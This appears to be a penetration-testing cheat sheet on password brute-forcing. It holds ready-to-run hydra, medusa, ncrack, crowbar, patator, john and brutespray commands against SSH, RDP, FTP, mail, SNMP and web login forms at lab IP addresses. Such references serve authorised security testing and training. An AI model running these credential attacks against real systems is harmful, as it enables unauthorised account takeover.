# Bruteforcing

```bash
cewl
hash-identifier
# https://github.com/HashPals/Name-That-Hash
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
medusa -h 10.11.1.111 -u admin -P password-file.txt -M http -m DIR:/admin -T 10
ncrack -vv --user offsec -P password-file.txt rdp://10.11.1.111
crowbar -b rdp -s 10.11.1.111/32 -u victim -C /root/words.txt -n 1
patator http_fuzz url=https://10.10.10.10:3001/login method=POST accept_cookie=1 body='{"user":"admin","password":"FILE0","email":""}' 0=/root/acronim_dict.txt follow=1 -x ignore:fgrep='HTTP/2 422'
hydra -l root -P password-file.txt 10.11.1.111 ssh
hydra -P password-file.txt -v 10.11.1.111 snmp
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 10.11.1.111 ftp -V
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 10.11.1.111 pop3 -V
hydra -P /usr/share/wordlistsnmap.lst 10.11.1.111 smtp -V
hydra -L username.txt -p paswordl33t -t 4 ssh://10.10.1.111
hydra -L user.txt -P pass.txt 10.10.1.111 ftp

# PATATOR
patator http_fuzz url=https://10.10.10.10:3001/login method=POST accept_cookie=1 body='{"user":"admin","password":"FILE0","email":""}' 0=/root/acronim_dict.txt follow=1 -x ignore:fgrep='HTTP/2 422'

# SIMPLE LOGIN GET
hydra -L cewl_fin_50.txt -P cewl_fin_50.txt 10.11.1.111 http-get-form "/~login:username=^USER^&password=^PASS^&Login=Login:Unauthorized" -V

# GET FORM with HTTPS
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.11.1.111 -s 443 -S https-get-form "/index.php:login=^USER^&password=^PASS^:Incorrect login/password\!"

# SIMPLE LOGIN POST
hydra -l root@localhost -P cewl 10.11.1.111 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-120&User=^USER^&Password=^PASS^:F=Login failed" -I

# API REST LOGIN POST
hydra -l admin -P /usr/share/wordlists/wfuzz/others/common_pass.txt -V -s 80 10.11.1.111 http-post-form "/centreon/api/index.php?action=authenticate:username=^USER^&password=^PASS^:Bad credentials" -t 64

# Password spraying bruteforcer
# https://github.com/x90skysn3k/brutespray
python brutespray.py --file nmap.gnmap -U /usr/share/wordlist/user.txt -P /usr/share/wordlist/pass.txt --threads 5 --hosts 5

# Password generator
# https://github.com/edoardottt/longtongue
python3 longtongue.py
```

